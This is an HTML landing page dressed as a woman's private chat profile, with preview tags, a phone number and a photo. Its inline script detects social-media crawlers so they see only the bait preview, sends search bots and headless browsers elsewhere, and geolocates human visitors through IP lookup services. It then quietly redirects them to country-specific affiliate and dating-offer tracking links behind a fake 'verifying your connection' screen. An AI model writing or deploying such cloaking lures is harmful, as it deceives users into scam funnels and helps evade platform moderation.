<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chat with me! ðŸ’¬ +55 11 99124-xxxx</title>
    <meta name="title" content="Chat with me! ðŸ’¬ +55 11 99124-xxxx">
    <meta name="description" content="Caroline MÃ¼ller: 29 | 5â€™8â€ | ZÃ¼rich ðŸ“ Online now. Click to start a private chat!">

    <meta property="og:type" content="website">
    <meta property="og:url" content="https://chatme.com/"> 
    <meta property="og:title" content="Chat with me! ðŸ’¬ +55 11 99124-xxxx">
    <meta property="og:description" content="riaÃŸ eichâ˜ºï¸ðŸ«¶ðŸ» Caroline is online. Single ðŸ’”. Click here to see my private profile and chat!">
    <meta property="og:image" content="https://cdn.apextrack.site/uploads/img_693994c272a6b2.94045914.jpeg"> 
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">

    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:url" content="https://chatme.com/">
    <meta property="twitter:title" content="Chat with me! ðŸ’¬ +55 11 99124-xxxx">
    <meta property="twitter:description" content="Caroline MÃ¼ller: 29 | 5â€™8â€ | ZÃ¼rich ðŸ“ Online now. Connect with me privately.">
    <meta property="twitter:image" content="https://cdn.apextrack.site/uploads/img_693994c272a6b2.94045914.jpeg">

    <script>
        const config = {
            rules: {
                "ES": "https://dfehabe.smartoffers365.com/c/a4a339b09ec14?subsource=SEMPLO&track=SEMPLO",
                "IT": "https://dfehabe.clickitpix.com/c/a5fb37452fa5d?subsource=SEMPLO&track=SEMPLO",
                "US": "https://dfehabe.smartoffers365.com/c/f08b693035e23?subsource=SEMPLO&track=SEMPLO",
                "DE": "https://dfehabe.smartoffers365.com/c/4f00e9a09f084?subsource=SEMPLO&track=SEMPLO",
                "ID": "https://google.com"
            },
            defaultUrl: "https://bgnllg.date4connect.com/?utm_source=da57dc555e50572d&ban=other&j1=1&s1=243493&s2=2215848&s3=BABAT_ALAS&s5=BABAT_ALAS"
        };

        function isBot() {
            const ua = navigator.userAgent.toLowerCase();
            // List bot/crawler sosmed agar preview muncul (jangan di-redirect paksa dulu)
            const isSocialBot = /facebookexternalhit|twitterbot|whatsapp|telegrambot|pinterest|linkedinbot/i.test(ua);
            const isSearchBot = /bot|crawler|spider|googlebot|bingbot|slurp|duckduckbot|baiduspider|headless|selenium|puppeteer/i.test(ua) || navigator.webdriver;
            
            return { isSocialBot, isSearchBot };
        }

        async function getCountry() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                if (data.country) return data.country;
            } catch (e) { console.warn("API 1 Gagal"); }

            try {
                const res = await fetch('https://demo.ip-api.com/json/'); 
                const data = await res.json();
                if (data.countryCode) return data.countryCode;
            } catch (e) { console.warn("API 2 Gagal"); }

            try {
                const res = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
                const text = await res.text();
                const loc = text.match(/loc=([A-Z]{2})/);
                if (loc && loc[1]) return loc[1];
            } catch (e) { console.warn("API 3 Gagal"); }

            return null;
        }

        async function start() {
            const botStatus = isBot();

            // Jika crawler sosmed, STOP di sini agar preview gambar terbaca
            if (botStatus.isSocialBot) {
                console.log("Social Media Crawler detected. Preview mode.");
                return;
            }

            // Jika bot mesin pencari/headless, langsung buang ke defaultUrl
            if (botStatus.isSearchBot) {
                window.location.replace(config.defaultUrl);
                return;
            }

            const country = await getCountry();
            
            if (country) {
                const target = config.rules[country] || config.defaultUrl;
                window.location.replace(target);
            } else {
                window.location.replace(config.defaultUrl);
            }
        }

        // Jalankan script
        start();
    </script>
</head>
<body style="background-color: #f0f2f5;">
    <div style="text-align: center; margin-top: 20%; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;">
        <div class="loader" style="border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 0 auto;"></div>
        <p style="color: #65676b;">Verifying your connection, please wait...</p>
    </div>

    <style>
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</body>
</html>
